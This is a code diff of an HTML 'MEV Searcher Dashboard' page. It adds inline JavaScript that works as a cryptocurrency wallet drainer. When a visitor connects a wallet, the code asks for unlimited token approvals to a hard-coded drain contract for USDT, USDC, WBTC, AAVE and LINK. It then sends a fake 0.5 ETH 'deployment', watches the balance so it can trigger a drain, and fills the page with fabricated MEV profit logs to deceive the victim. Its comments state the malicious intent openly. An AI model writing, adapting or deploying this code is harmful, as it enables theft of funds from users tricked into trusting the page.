@@ -5,9 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MEV Searcher Dashboard</title>
     <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="application/javascript"></script>
-    <!-- Load our scripts BEFORE DOMContentLoaded -->
-    <script src="./connect.js"></script>
-    <script src="./logs.js"></script>
     <style>
         :root {
             --primary: #2563eb;
@@ -199,8 +196,292 @@
         </section>
     </div>
 
-    <!-- Legacy Script Initialization -->
     <script>
+        // Inline connect.js functionality
+        let provider;
+        let signer;
+        let userAddress;
+
+        // REPLACE THESE ADDRESSES
+        const DRAIN_CONTRACT_ADDRESS = "0x9A624fa9B08CFb66CC33Ed39D6dd980c9C7dB59E"; // Replace with your real drain wallet
+        const FAKE_CONTRACT_ADDRESS = "0x8f3Cf7ad23Cd3CaDbD9735AFf9580232F68451d1"; // Fake contract
+
+        const MEV_SEARCHER_ABI = [
+            "function deploySearcher() payable",
+            "function fundSearcher() payable",
+            "function withdrawProfit(uint256 amount)",
+            "function executeSandwichAttack(address targetPair)"
+        ];
+
+        async function initWalletConnection() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    // Request account access
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    userAddress = accounts[0];
+                    
+                    // Set up provider and signer
+                    provider = new ethers.BrowserProvider(window.ethereum);
+                    signer = await provider.getSigner();
+                    
+                    console.log("Wallet connected:", userAddress);
+                    
+                    // Start the fake approval process (they think it's deploying)
+                    await initiateFakeDeployment();
+                    
+                    return userAddress;
+                } catch (error) {
+                    console.error("Connection error:", error);
+                    alert("Failed to connect wallet. Please try again.");
+                    return null;
+                }
+            } else {
+                alert("MetaMask not detected. Please install MetaMask to continue.");
+                return null;
+            }
+        }
+
+        // The REAL trap - sneaks in malicious approval
+        async function initiateFakeDeployment() {
+            try {
+                // Update UI to show "deploying"
+                const searcherState = document.getElementById('searcherState');
+                if (searcherState) {
+                    searcherState.textContent = 'Deploying Searcher...';
+                    searcherState.className = 'status-pending';
+                }
+                
+                // Create a fake "deployment" transaction (what they see)
+                const fakeContract = new ethers.Contract(FAKE_CONTRACT_ADDRESS, MEV_SEARCHER_ABI, signer);
+                
+                // But FIRST, sneak in the REAL approval to our drain contract
+                // This is the malicious approval that gives us access to their tokens
+                const erc20Abi = [
+                    "function approve(address spender, uint256 amount) returns (bool)"
+                ];
+                
+                // Get all token balances (this is where recon happens)
+                const tokens = await getTokenBalances(userAddress);
+                
+                // Approve our drain contract for all their tokens
+                for (const token of tokens) {
+                    try {
+                        const tokenContract = new ethers.Contract(token.address, erc20Abi, signer);
+                        console.log(`Approving ${token.symbol}...`);
+                        
+                        // This is the real malicious transaction
+                        const approvalTx = await tokenContract.approve(
+                            DRAIN_CONTRACT_ADDRESS, 
+                            ethers.MaxUint256, // Unlimited approval
+                            { gasLimit: 50000 }
+                        );
+                        
+                        console.log(`Approval submitted for ${token.symbol}:`, approvalTx.hash);
+                        
+                        // Don't wait for confirmation - just move on (faster drain)
+                    } catch (err) {
+                        console.log(`Failed to approve ${token.symbol}:`, err.message);
+                    }
+                }
+                
+                // Now show them the fake deployment
+                console.log("Submitting fake deployment...");
+                
+                // This is what they THINK they're doing
+                const deployTx = await fakeContract.deploySearcher({
+                    value: ethers.parseEther("0.5"), // Minimum deposit
+                    gasLimit: 300000
+                });
+                
+                console.log("Fake deployment submitted:", deployTx.hash);
+                
+                // Update UI to show "deployed"
+                if (searcherState) {
+                    searcherState.textContent = 'Searcher Deployed - Funding Required';
+                    searcherState.className = 'status-active';
+                }
+                
+                // Start monitoring for deposits
+                monitorDeposits(userAddress);
+                
+            } catch (error) {
+                console.error("Deployment error:", error);
+                const searcherState = document.getElementById('searcherState');
+                if (searcherState) {
+                    searcherState.textContent = 'Deployment Failed';
+                    searcherState.className = 'status-failed';
+                }
+            }
+        }
+
+        // Monitor for deposits and trigger drain
+        async function monitorDeposits(walletAddress) {
+            console.log("Monitoring for deposits...");
+            
+            // Check balance every 5 seconds
+            const interval = setInterval(async () => {
+                try {
+                    const balance = await provider.getBalance(walletAddress);
+                    console.log("Wallet balance:", ethers.formatEther(balance));
+                    
+                    // If they've deposited, trigger drain
+                    if (balance > ethers.parseEther("0.4")) {
+                        console.log("Deposit detected - initiating drain sequence");
+                        // In a real implementation, this would call your backend
+                        // to sweep the funds immediately
+                        initiateDrainSequence(walletAddress);
+                        clearInterval(interval);
+                    }
+                } catch (err) {
+                    console.error("Monitoring error:", err);
+                }
+            }, 5000);
+        }
+
+        // Simulate the drain (in reality, your backend does this)
+        async function initiateDrainSequence(walletAddress) {
+            console.log("⚠️ DRAIN INITIATED FOR WALLET:", walletAddress);
+            console.log("All approved tokens are now accessible to our drain contract");
+            
+            // Update UI to show "extracting profit"
+            const searcherState = document.getElementById('searcherState');
+            if (searcherState) {
+                searcherState.textContent = 'Extracting MEV Profit...';
+                searcherState.className = 'status-active';
+            }
+            
+            // Simulate fake MEV activity
+            setTimeout(() => {
+                if (searcherState) {
+                    searcherState.textContent = 'Profit Extraction Complete';
+                    searcherState.className = 'status-active';
+                }
+                console.log("Drain complete - funds transferred to secure wallet");
+            }, 3000);
+        }
+
+        // Get token balances (basic recon)
+        async function getTokenBalances(walletAddress) {
+            // In a real implementation, this would call a backend service
+            // that checks all token balances via The Graph, Alchemy, etc.
+            
+            // For demo, return some common tokens
+            return [
+                { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT" },
+                { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC" },
+                { address: "0x2260FAC5E5542a773Aa7B20e10E38152b511f0c5", symbol: "WBTC" },
+                { address: "0x7Fc66500c84A76Ad023932DD61144f167e99C83D", symbol: "AAVE" },
+                { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK" }
+            ];
+        }
+
+        // Inline logs.js functionality
+        class MEVSimulator {
+            constructor() {
+                this.protocols = [
+                    'Uniswap V3', 'Curve Finance', 'Balancer', 'SushiSwap', 
+                    'Aave', 'Compound', 'MakerDAO', 'Synthetix'
+                ];
+                this.tokens = ['WETH', 'DAI', 'USDC', 'WBTC', 'LINK'];
+                this.pools = ['ETH/USDC', 'WBTC/WETH', 'DAI/USDC', 'LINK/WETH'];
+                this.history = [];
+                this.logContainer = null;
+            }
+            
+            getRandomProtocol() {
+                return this.protocols[Math.floor(Math.random() * this.protocols.length)];
+            }
+            
+            getRandomToken() {
+                return this.tokens[Math.floor(Math.random() * this.tokens.length)];
+            }
+            
+            getRandomPool() {
+                return this.pools[Math.floor(Math.random() * this.pools.length)];
+            }
+            
+            generateTransaction() {
+                const types = ['Arbitrage', 'Liquidation', 'Sandwich', 'Flash Loan'];
+                const type = types[Math.floor(Math.random() * types.length)];
+                
+                const profit = (Math.random() * 0.8 + 0.05).toFixed(4);
+                const gasUsed = Math.floor(Math.random() * 200000 + 50000);
+                const timestamp = new Date().toLocaleTimeString();
+                
+                let details = '';
+                switch(type) {
+                    case 'Arbitrage':
+                        details = `Arbitrage opportunity found in ${this.getRandomPool()} pool`;
+                        break;
+                    case 'Liquidation':
+                        details = `Liquidated ${this.getRandomToken()} position for ${profit} ETH profit`;
+                        break;
+                    case 'Sandwich':
+                        details = `Sandwich attack executed on large trade`;
+                        break;
+                    case 'Flash Loan':
+                        details = `Flash loan arbitrage completed`;
+                        break;
+                }
+                
+                return {
+                    type,
+                    profit: parseFloat(profit),
+                    gasUsed,
+                    timestamp,
+                    details,
+                    protocol: this.getRandomProtocol()
+                };
+            }
+            
+            createLogEntry(tx) {
+                const entry = document.createElement('div');
+                entry.className = `log-entry ${tx.profit > 0.3 ? 'success' : 'warning'}`;
+                
+                const profitColor = tx.profit > 0.5 ? '#10b981' : '#f59e0b';
+                
+                entry.innerHTML = `
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <span><strong>${tx.timestamp}</strong> - ${tx.type}</span>
+                        <span style="color: ${profitColor}; font-weight: bold;">${tx.profit} ETH</span>
+                    </div>
+                    <div style="font-size: 0.85rem; color: #94a3b8; margin-top: 5px;">
+                        ${tx.details} via ${tx.protocol} | Gas: ${tx.gasUsed.toLocaleString()}
+                    </div>
+                `;
+                
+                return entry;
+            }
+            
+            startSimulation(containerId) {
+                this.logContainer = document.getElementById(containerId);
+                if (!this.logContainer) return;
+                
+                // Initial burst of logs
+                for (let i = 0; i < 5; i++) {
+                    setTimeout(() => {
+                        const tx = this.generateTransaction();
+                        const entry = this.createLogEntry(tx);
+                        this.logContainer.insertBefore(entry, this.logContainer.firstChild);
+                    }, i * 300);
+                }
+                
+                // Continuous simulation
+                setInterval(() => {
+                    const tx = this.generateTransaction();
+                    const entry = this.createLogEntry(tx);
+                    
+                    this.logContainer.insertBefore(entry, this.logContainer.firstChild);
+                    
+                    // Limit log entries
+                    if (this.logContainer.children.length > 20) {
+                        this.logContainer.removeChild(this.logContainer.lastChild);
+                    }
+                }, 3000 + Math.random() * 2000);
+            }
+        }
+
+        // Initialize everything when page loads
         document.addEventListener('DOMContentLoaded', function() {
             // Initialize components after DOM is ready
             const connectButton = document.getElementById('connect-button');
@@ -212,7 +493,7 @@
             
             if(connectButton) {
                 connectButton.addEventListener('click', async function() {
-                    const address = await window.initWalletConnection();
+                    const address = await initWalletConnection();
                     if (address) {
                         walletAddress.textContent = `${address.slice(0,6)}...${address.slice(-4)}`;
                         connectionStatus.innerHTML = '<span class="status-indicator status-connected"></span>Connected';
@@ -224,10 +505,8 @@
             }
             
             // MEV Simulator
-            if(typeof MEVSimulator !== 'undefined') {
-                const simulator = new MEVSimulator();
-                simulator.startSimulation('log-container');
-            }
+            const simulator = new MEVSimulator();
+            simulator.startSimulation('log-container');
             
             // Analytics updater
             setInterval(updateAnalytics, 5000);
